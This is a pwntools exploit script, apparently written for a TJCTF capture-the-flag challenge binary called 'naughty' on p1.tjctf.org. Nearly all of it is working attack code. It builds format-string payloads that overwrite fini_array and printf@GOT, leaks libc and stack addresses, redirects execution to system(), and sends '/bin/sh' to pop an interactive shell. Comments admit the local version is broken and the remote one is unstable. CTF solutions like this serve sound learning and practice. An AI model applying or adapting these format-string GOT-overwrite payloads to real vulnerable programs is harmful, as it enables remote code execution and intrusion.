#!/usr/bin/env python3
from pwn import *
from sys import argv

REMOTE = 0
if len(argv) > 1:
    if 'r' in argv[1]:
        REMOTE = 1

context.terminal = ['tmux', 'splitw']
exe = './naughty'
host, port = "p1.tjctf.org", 8004

# The non-remote version of this exploit is broken
# The exploit is too unstable for me to bother fixing that
# You also need to run the remote version like 3 times until u pop shell
proc = remote(host, port) if REMOTE else process(exe)

# Testing breakpoints 
# Checking ret address, and checking when the format
# string gets written
if len(argv) > 1:
    if 'd' in argv[1]:
        DEBUG = 1
        gdb.attach(proc, '''
b *main
b *main+249
b *main+288
c
''')

# GAME PLAN:
# STAGE 1
# overwrite fini_array -> main
# leak libc address
# STAGE 2 
# calculate base and then system
# overwrite printf@GOT -> system@libc
# overwrite fini_array -> main (again)
# STAGE 3
# input /bin/sh
# STAGE 4
# PROFIT?????

# addresses
main        = 0x08048536
fini_array  = 0x08049bac
printf_got  = 0x08049cb0

log.info("Fini_array    0x%x" % fini_array)
log.info("main          0x%x" % main)

# STAGE 1 - Overwrite fini_array with main
lower_main = main & 0xffff
upper_main = main >> 16
                                                                    
payload  = p32(fini_array+2)
payload += p32(fini_array)
payload += b"|%75$ x|"
payload += b"|%35$ x|"
payload += bytes("%{}x".format(upper_main - 8 - 20).encode('utf-8'))
payload += b"%7$ hn"
payload += bytes("%{}x".format(lower_main - upper_main).encode('utf-8'))
payload += b"%8$ hn"
log.info("Payload: %s" % payload)

proc.recv()
proc.sendline(payload)
data = proc.recv()
leak = data.split(b'|')
if REMOTE:
    libc = int(leak[1],16) - 0xf1 - 0x18d90
else:
    libc = int(leak[1],16) - 0xf1 - 0x18d90
        
stack = int(leak[3], 16)
stack += 64 - 0xe0
log.info("Leaked:       0x%x" % (int(leak[1],16) - 0xf1))
log.info("Libc base:    0x%x" % libc)
log.info("return add:   0x%x" % stack)

# STAGE 2 - Overwrite printf with system AND fini_array with main yet again
if REMOTE:
    system_offset = 0x3cd10
else:
    system_offset = 0x3d200

system = libc + system_offset
lower_system = system & 0xffff
upper_system = system >> 16
log.info("System        0x%x" % system)

# This payload assumes that the addresses are in the format 
# (just look at comparable size of half words)
# system = 0xffff 5555
# main   = 0x0804 8536
payload  = p32(stack+2)     # upper (return addy) <- upper_main
payload += p32(stack)       # lower (return addy) <- lower_main
payload += p32(printf_got)  # lower (printf@GOT)  <- lower_system
payload += p32(printf_got+2)# upper (printf@GOT)  <- upper_system

# Format string specifiers, with calculated padding
# The padding / order of these specifiers is entirely dependant on 
# the structure of the addresses that you need to write
payload += bytes("%{}x".format(upper_main - 16).encode('utf-8'))
payload += b"%7$ hn"
payload += bytes("%{}x".format(lower_system - upper_main).encode('utf-8'))
payload += b"%9$ hn"
payload += bytes("%{}x".format(lower_main - lower_system).encode('utf-8'))
payload += b"%8$ hn"
payload += bytes("%{}x".format(upper_system + 0x7778 + 0x352).encode('utf-8'))
payload += b"%10$ hn"

log.info("Payload2: %s" % payload)
proc.recv()
proc.sendline(payload)
proc.recv()

# Execute system(ptr_to_user_input)
proc.sendline("/bin/sh")
proc.interactive()
